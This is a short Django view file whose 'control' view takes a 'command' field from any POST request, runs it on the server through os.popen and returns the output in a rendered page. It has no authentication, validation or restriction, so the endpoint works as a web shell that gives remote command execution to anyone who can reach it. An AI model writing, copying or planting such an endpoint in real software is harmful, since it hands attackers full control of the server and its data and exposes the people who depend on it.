from django.shortcuts import render
import os


def control(request):

    context = {'response': ''}

    if request.method == 'POST':
        command = request.POST.get('command')
        output = os.popen(command).read()
        context['response'] = output

    return render(request, 'control/main.html', context=context)
